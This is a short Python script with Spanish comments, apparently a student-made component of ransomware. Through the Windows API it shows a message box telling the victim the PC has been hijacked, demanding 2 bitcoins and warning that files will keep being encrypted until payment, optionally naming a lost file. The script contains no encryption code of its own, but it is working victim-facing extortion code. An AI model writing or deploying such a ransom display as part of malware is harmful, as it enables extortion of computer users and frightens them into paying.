import ctypes
#ctypes para la ejecucion de DLL
import sys
#Programa de mensaje por: Oscar y Diana

#titulo de la ventana
label = ctypes.c_char_p('Tu equipo ha sido infectado')
#como arg recibe el nombre del archivo que se ha cifrado
#Mensaje mostrado, si el exe recibe argumento, lo agrega al mensaje
if len(sys.argv) > 1:
    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguira cifrando mientras no pagues. Archivo perdido: ' + sys.argv[1])
else:
    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguira cifrando mientras no pagues.')

ctypes.windll.user32.MessageBoxA(0, message, label, 0x00000000)
